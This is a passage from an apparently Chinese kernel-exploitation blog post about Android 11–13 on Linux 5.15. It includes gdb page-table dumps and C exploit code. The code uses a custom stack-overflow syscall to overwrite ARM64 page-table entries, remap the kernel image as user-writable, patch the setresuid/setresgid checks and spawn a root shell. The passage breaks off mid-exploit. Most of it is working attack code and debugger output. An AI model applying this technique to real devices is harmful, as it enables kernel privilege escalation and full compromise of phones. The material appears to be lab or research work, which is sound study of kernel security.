class="number">0xB5</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;setresuid_if_addr_new content: 0x%lx\n&quot;,*(unsigned long*)setresuid_if_addr_new);             // 为什么加这个打印会报bus error的错？？</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* sys_setresgid*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresgid_if_addr = <span class="number">0xFFFFFFC00815E4E8</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresgid_if_addr_new = RE_MAP_ADDR + <span class="number">0x200000</span> + (setresgid_if_addr - IMAGE_BASE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresgid_if_addr_new: 0x%lx\n&quot;</span>,setresgid_if_addr_new);</span><br><span class="line">    *(<span class="keyword">char</span> *)(setresgid_if_addr_new+<span class="number">3</span>) = <span class="number">0xB5</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;setresgid_if_addr_new content: 0x%lx\n&quot;,*(unsigned long*)setresgid_if_addr_new);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresuid\n&quot;</span>);</span><br><span class="line">    setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresgid\n&quot;</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/system/bin/sh\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="android-13"   >
          <a href="#android-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-13" class="headerlink" title="android 13"></a>android 13</h2>
      <blockquote>
<p>内核版本：linux 5.15.78</p>
</blockquote>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/iomem</span></span><br><span class="line">[...]</span><br><span class="line">40000000-bfffffff : System RAM</span><br><span class="line">  40210000-4299ffff : Kernel code</span><br><span class="line">  429a0000-42bfffff : reserved</span><br><span class="line">  42c00000-42eeffff : Kernel data</span><br><span class="line">  47fff000-48444fff : reserved</span><br><span class="line">  48600000-4860ffff : reserved</span><br><span class="line">  ad400000-bf9fffff : reserved</span><br><span class="line">  bfa1d000-bfa9cfff : reserved</span><br><span class="line">  bfa9d000-bfb9dfff : reserved</span><br><span class="line">  bfb9e000-bfbd7fff : reserved</span><br><span class="line">  bfbda000-bfbdcfff : reserved</span><br><span class="line">  bfbdd000-bfbddfff : reserved</span><br><span class="line">  bfbde000-bfbfefff : reserved</span><br><span class="line">  bfbff000-bfc09fff : reserved</span><br><span class="line">  bfc0a000-bfffffff : reserved</span><br><span class="line">[...]</span><br></pre></td></tr></table></div></figure>
<p>利用方法同android 11/12，将 0xffffffc200000000 对应的一级页表项设置成 d_block，让用户态可以任意读写内核image。</p>
<ol>
<li><p>该一级页表项对应两处地址</p>
<p>一处是在 swapper_pg_dir 中的偏移</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/2gx 0xFFFFFFC00A79F000+0x840</span><br><span class="line">0xffffffc00a79f840 &lt;swapper_pg_dir+2112&gt;:       0x00680081c0000701      0x0068008200000701</span><br></pre></td></tr></table></div></figure>
<p>一处是在线性映射区中的偏移</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 偏移</span></span><br><span class="line">&gt;&gt;&gt; hex(0xffffffc00a79f840 - 0xFFFFFFC008010000+ 0x210000)</span><br><span class="line"><span class="string">&#x27;0x299f840&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 线性映射区在0xFFFFFF8000000000</span></span><br><span class="line"><span class="comment"># 对应页表项也映射到了虚拟地址 0xffffff800299f840 处</span></span><br><span class="line">gef➤  x/2gx 0xFFFFFF8000000000+0x299f840</span><br><span class="line">0xffffff800299f840:     0x00680081c0000701      0x0068008200000701</span><br><span class="line"></span><br><span class="line">40000000-bfffffff : System RAM</span><br><span class="line">  40210000-4299ffff : Kernel code     <span class="comment"># 从image的_stext开始映射，对应虚拟地址0xFFFFFFC008010000</span></span><br><span class="line">  429a0000-42bfffff : reserved</span><br><span class="line">  42c00000-42eeffff : Kernel data</span><br></pre></td></tr></table></div></figure>
<p>通过线性映射区可以接着调试查看二级页表，三级页表。由于 0xffffff800299f840处是只读的，我们考虑将 0xffffff800299f000对应的页表项设置成用户态和内核态可读写的状态，这样就可以在用户态写一级页表了。</p>
</li>
<li><p>0xffffff800299f000地址对应的物理页表项</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">0xffffff800299f000</span><br><span class="line">11111111 11111111 11111111 10000000 00000010 10011001 11110000 00000000</span><br><span class="line">0级页表未使用</span><br><span class="line">1级页表偏移：0000000 00 - 0*8</span><br><span class="line">2级页表偏移：000010 100 - 20*8=0xa0</span><br><span class="line">3级页表偏移：11001 1111 - 415*8=0xcf8</span><br><span class="line"></span><br><span class="line">gef➤  x/20gx 0xFFFFFF8000000000+0x299f840</span><br><span class="line">0xffffff800299f840:     0x00680081c0000701      0x0068008200000701</span><br><span class="line">0xffffff800299f850:     0x0068008240000701      0x0068008280000701</span><br><span class="line">0xffffff800299f860:     0x00680082c0000701      0x0068008300000701</span><br><span class="line">0xffffff800299f870:     0x0068008340000701      0x0068008380000701</span><br><span class="line">0xffffff800299f880:     0x00680083c0000701      0x0000000000000000</span><br><span class="line">0xffffff800299f890:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f8a0:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f8b0:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f8c0:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f8d0:     0x0000000000000000      0x0000000000000000</span><br><span class="line">gef➤  x/20gx 0xFFFFFF8000000000+0x299f000</span><br><span class="line">0xffffff800299f000:     0x18000000bfff9003      0x18000000bfe0a003</span><br><span class="line">0xffffff800299f010:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f020:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f030:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f040:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f050:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f060:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f070:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f080:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0xffffff800299f090:     0x0000000000000000      0x0000000000000000</span><br><span class="line">gef➤  x/20gx 0xFFFFFF8000000000+(0xbfff9000-0x40000000)+0xa0</span><br><span class="line">0xffffff807fff90a0:     0x18000000bfff6003      0x18000000bfff5003</span><br><span class="line">0xffffff807fff90b0:     0x18000000bfff4003      0x18000000bfff3003</span><br><span class="line">0xffffff807fff90c0:     0x18000000bfff2003      0x18000000bfff1003</span><br><span class="line">0xffffff807fff90d0:     0x18000000bfff0003      0x18000000bffef003</span><br><span class="line">0xffffff807fff90e0:     0x18000000bffee003      0x18000000bffed003</span><br><span class="line">0xffffff807fff90f0:     0x18000000bffec003      0x18000000bffeb003</span><br><span class="line">0xffffff807fff9100:     0x18000000bffea003      0x18000000bffe9003</span><br><span class="line">0xffffff807fff9110:     0x18000000bffe8003      0x18000000bffe7003</span><br><span class="line">0xffffff807fff9120:     0x18000000bffe6003      0x18000000bffe5003</span><br><span class="line">0xffffff807fff9130:     0x18000000bffe4003      0x18000000bffe3003</span><br><span class="line">gef➤  x/20gx 0xFFFFFF8000000000+(0xbfff6000-0x40000000)+0xcf8</span><br><span class="line">0xffffff807fff6cf8:     0x006000004299f783      0x00680000429a0707</span><br><span class="line">0xffffff807fff6d08:     0x00680000429a1707      0x00680000429a2707</span><br><span class="line">0xffffff807fff6d18:     0x00680000429a3707      0x00680000429a4707</span><br><span class="line">0xffffff807fff6d28:     0x00680000429a5707      0x00680000429a6707</span><br><span class="line">0xffffff807fff6d38:     0x00680000429a7707      0x00680000429a8707</span><br><span class="line">0xffffff807fff6d48:     0x00680000429a9707      0x00680000429aa707</span><br><span class="line">0xffffff807fff6d58:     0x00680000429ab707      0x00680000429ac707</span><br><span class="line">0xffffff807fff6d68:     0x00680000429ad707      0x00680000429ae707</span><br><span class="line">0xffffff807fff6d78:     0x00680000429af707      0x00680000429b0707</span><br><span class="line">0xffffff807fff6d88:     0x00680000429b1707      0x00680000429b2707</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xffffff807fff6cf8 处就是 0xffffff800299f000 虚拟地址对应的页表项</span></span><br><span class="line"><span class="comment"># 0x783：0111 1000 0011 - bit[7:6]表示仅内核态可读</span></span><br><span class="line"><span class="comment"># 0x743：0111 0100 0011 - bit[7:6]表示用户态和内核态可读写</span></span><br><span class="line"></span><br><span class="line">gef➤  monitor xp /20gx 0x4299f000</span><br><span class="line">000000004299f000: 0x18000000bfff9003 0x18000000bfe0a003</span><br><span class="line">000000004299f010: 0x0000000000000000 0x0000000000000000</span><br><span class="line">000000004299f020: 0x0000000000000000 0x0000000000000000</span><br><span class="line">000000004299f030: 0x0000000000000000 0x0000000000000000</span><br><span class="line">000000004299f040: 0x0000000000000000 0x0000000000000000</span><br><span class="line">000000004299f050: 0x0000000000000000 0x0000000000000000</span><br><span class="line">000000004299f060: 0x0000000000000000 0x0000000000000000</span><br><span class="line">000000004299f070: 0x0000000000000000 0x0000000000000000</span><br><span class="line">000000004299f080: 0x0000000000000000 0x0000000000000000</span><br><span class="line">000000004299f090: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></div></figure></li>
<li><p>写物理页表项</p>
<p>将虚拟地址 0xffffff807fff6cf8 处写成 0x006000004299f743 ，使 0xffffff800299f000 这个页面用户态可读写，那么就能将我们精心构造的d_block写入 0xffffff800299f840 中，从而达到任意读写内核image的目的了。</p>
</li>
</ol>
<p>本地root shell</p>
<p><img   src="image-20230906145136302.png?size=600" style="width: 600px;"  alt="image-20230906145136302"></p>
<p>exp 如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_STACKOF 601</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> arg1, arg2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEXDUMP_COLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEXDUMP_COLS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">void</span> *mem, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : <span class="number">0</span>); i++) &#123;</span><br><span class="line">        <span class="comment">/* print offset */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%06x: &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print hex data */</span></span><br><span class="line">        <span class="keyword">if</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, <span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end of block, just aligning for ASCII dump */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;        </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print ASCII dump */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == (HEXDUMP_COLS - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i - (HEXDUMP_COLS - <span class="number">1</span>); j &lt;= i; j++) &#123;</span><br><span class="line">                 <span class="comment">/* end of block, not really printing */</span></span><br><span class="line">                <span class="keyword">if</span>(j &gt;= len) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* printable char */</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isprint</span>(((<span class="keyword">char</span>*)mem)[j])) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                 <span class="comment">/* other char */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_read(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;k_stackof_read - arg2: %lx\n&quot;,arg2);</span></span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_write(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;k_stackof_write - arg2: %lx\n&quot;,arg2);</span></span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_PHYS_ADDR 0x40210000</span></span><br><span class="line"><span class="comment">// #define RE_MAP_ADDR 0xFFFFFFC500000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RE_MAP_ADDR 0xFFFFFFC200000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_BASE 0xFFFFFFC008000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> SYMBOL__swapper_pg_dir = <span class="number">0xFFFFFFC00A79F000</span>;              <span class="comment">// in android11 there is a swapper_pg_dir symbol</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remap_addr_pte = <span class="number">0xffffff807fff6cf8</span>;              <span class="comment">// linear addr space</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remap_addr_dblock_addr = <span class="number">0xffffff800299f840</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_block_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_block;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mirror</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_phys, <span class="keyword">unsigned</span> <span class="keyword">long</span> mirror_base)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index1 = (mirror_base &amp; <span class="number">0x0000007fc0000000</span>) &gt;&gt; <span class="number">30</span>; <span class="comment">// bits[39:31]</span></span><br><span class="line">    d_block_addr = SYMBOL__swapper_pg_dir + index1 * <span class="number">8</span>;  <span class="comment">// target Table Descriptor Address</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;descriptor: 0x%lx + %d x 8 = 0x%lx\n&quot;</span>, SYMBOL__swapper_pg_dir, index1, d_block_addr);</span><br><span class="line"></span><br><span class="line">    d_block = <span class="number">0</span>;</span><br><span class="line">    d_block |= <span class="number">0x1</span> ; <span class="comment">// Block entry</span></span><br><span class="line">    <span class="comment">/* Lower attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">11</span>); <span class="comment">// bits[11], nG</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">10</span>); <span class="comment">// bits[10], AF</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">9</span>); <span class="comment">// bits[9], SH[1]</span></span><br><span class="line">    d_block |= <span class="number">0x40</span>; <span class="comment">// bits[7:6], AP[2:1] = 01</span></span><br><span class="line">    d_block |= <span class="number">0x20</span>; <span class="comment">// bits[5], NS</span></span><br><span class="line">    d_block |= <span class="number">0x10</span>; <span class="comment">// bits[2:0], AttrIndx[2:0]</span></span><br><span class="line">    d_block |= (kernel_phys &amp; <span class="number">0x0000ffffc0000000</span>); <span class="comment">// bits[47:30], output address</span></span><br><span class="line">    <span class="comment">/* Upper attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">52</span>); <span class="comment">// bits[52], Contiguous</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">53</span>); <span class="comment">// bits[53], PXN</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">54</span>); <span class="comment">// bits[54], XN</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d_block = 0x%lx\n&quot;</span>, d_block);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line">    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = mmap(<span class="number">0x60000000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>( buf == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="string">&quot;mmap() thread&quot;</span>);    </span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* read_buf = buf + (<span class="number">0x1000</span><span class="number">-0x9b0</span>);</span><br><span class="line">    k_stackof_read(read_buf, <span class="number">0x9b0</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte;           <span class="comment">// remap_addr_pte; </span></span><br><span class="line">    hexdump(read_buf, <span class="number">0x9b0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*0x4299f743*/</span></span><br><span class="line">    <span class="keyword">int</span> write_size = <span class="number">0x9b0</span>+<span class="number">0x13</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte+<span class="number">1</span>; </span><br><span class="line">    write_size = <span class="number">0x9b0</span>+<span class="number">0xc7</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte+<span class="number">2</span>; </span><br><span class="line">    write_size = <span class="number">0x9b0</span>+<span class="number">0x69</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte+<span class="number">3</span>; </span><br><span class="line">    write_size = <span class="number">0x9b0</span>+<span class="number">0x12</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)remap_addr_dblock_addr = d_block;                